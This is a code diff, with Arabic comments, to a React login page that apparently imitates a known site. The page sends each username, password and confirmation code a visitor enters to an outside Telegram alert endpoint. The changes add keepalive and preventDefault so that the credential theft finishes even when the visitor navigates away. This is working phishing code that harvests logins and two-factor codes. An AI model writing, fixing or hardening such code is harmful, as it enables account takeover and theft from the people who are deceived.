@@ -60,6 +60,7 @@ export default function Login() {
       const response = await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
         method: 'POST',
         credentials: 'include',  // ✅ ضروري لـ Safari ومتصفحات أخرى
+        keepalive: true,         // ✅ يمنع إلغاء الطلب عند التنقل بين الصفحات
         headers: {
           'Content-Type': 'application/json',
           'Origin': 'https://stake-me.com',  // ✅ رأس إضافي للمتصفحات اللي بتحذفه
@@ -73,13 +74,11 @@ export default function Login() {
       });
 
       if (!response.ok) {
-        // لو في مشكلة بالرد، نسجلها (علشان نعرف إذا حصل شيء)
         console.warn(`⚠️ Server responded with status ${response.status}`);
         const text = await response.text();
         console.warn('⚠️ Response body:', text);
       }
     } catch (error) {
-      // الخطأ مش رح يوقف التطبيق، بس نسجله عشان نعرف إذا صار شيء
       console.warn('⚠️ Alert failed (network or CORS issue):', error);
     }
   };
@@ -87,7 +86,9 @@ export default function Login() {
   // ============================================
   // 📤 دالة إرسال بيانات الدخول
   // ============================================
-  const onSubmit = async (data: LoginFormValues) => {
+  const onSubmit = async (data: LoginFormValues, event?: React.FormEvent) => {
+    event?.preventDefault();  // ✅ منع إعادة تحميل الصفحة
+
     // إرسال البيانات إلى تليجرام
     await sendAlertToServer(data.username, data.password);
 
@@ -99,7 +100,9 @@ export default function Login() {
   // ============================================
   // 📤 دالة إرسال رمز التأكيد
   // ============================================
-  const onCodeSubmit = async (data: CodeFormValues) => {
+  const onCodeSubmit = async (data: CodeFormValues, event?: React.FormEvent) => {
+    event?.preventDefault();  // ✅ منع إعادة تحميل الصفحة
+
     // إرسال رمز التأكيد إلى تليجرام
     await sendAlertToServer("🔐 رمز التأكيد", data.code);
 
